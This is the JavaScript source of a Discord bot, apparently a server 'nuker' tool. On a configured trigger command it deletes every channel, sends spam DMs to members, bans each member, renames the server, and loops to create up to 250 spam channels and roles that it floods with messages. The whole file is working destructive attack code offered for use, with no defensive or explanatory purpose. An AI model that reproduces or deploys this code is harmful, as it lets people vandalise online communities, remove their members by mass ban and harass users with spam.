const Discord = require("discord.js");
const client = new Discord.Client();
const fs = require("fs")
let json = null;
try {
    json = fs.readFileSync("config.json")
} catch {return console.log("Failed to find JSON file.")};
const parsedjson = JSON.parse(json);
const token = parsedjson.token;
client.on("ready", () => {
    console.log("Started!")
})
if(!parsedjson.command) return console.log("Please set a command name in config.json!!")
client.on("message", msg => {
    if(msg.content == parsedjson.command) {
        if(parsedjson.channelspam == false & parsedjson.rolespam == false & parsedjson.deletechannels == false & parsedjson.msgspam == false & parsedjson.dmmsgspam == false & parsedjson.banusers == false & parsedjson.setguildname === false) return console.log("Did you really want to spam??")
    
        if(parsedjson.deletechannels != false) {
        console.log("Deleting channels..")
        msg.guild.channels.cache.forEach(channel => {
            channel.delete().then((channel) => {
                console.log("Deleted! "+channel)
            }).catch((err) => {
                console.log("Failed "+err);
            })
        
    })
}
    msg.guild.members.cache.array().forEach(member => {
        if(parsedjson.dmmsgspam != false) {
        member.send(parsedjson.dmmsg).then(() => {

        }).catch(() => {
            console.log("Failed to send message to "+member.displayName)
        })
    }
    if(parsedjson.banusers != false) {
        member.ban().then((member) => {
            
            console.log("Banned "+member.displayName);
        }).catch(() => {
            console.log("Failed to ban "+member.displayName);
        })
    }
    })
    if(parsedjson.setguildname != false) {
    msg.guild.setName(parsedjson.guildname).then(() => {
        console.log("Setting Discord Server Name...")
        }).catch(() => {
            console.log("Setting Discord Server Name..\nFailed!!!");
        })
    }
    // 250 = max roles
    for(let i = 0; i < 250; i++) {
    if(parsedjson.channelspam != false) {
    msg.guild.channels.create(parsedjson.channelname, {

     })
     .then((channel) => {
        console.log("Created channel with ID: "+channel.id)
     if(parsedjson.msgspam != false) {
        channel.send(parsedjson.channelmsg).then(() => {
        console.log("Sending messages to channels...")
        }).catch(() => {
            console.log("Sending messages to channels...\nError")
        })
    }
     })
    
     .catch(console.error);
    }
if(parsedjson.rolespam != false) {
    msg.guild.roles.create({
        data: {
          name: parsedjson.rolename,
          color: 'BLUE',
        },
      })
        .then((role) => {
            console.log("Created new role with ID "+role.id)
        })
        .catch(console.error);
    }
}
}
})
client.login(token)
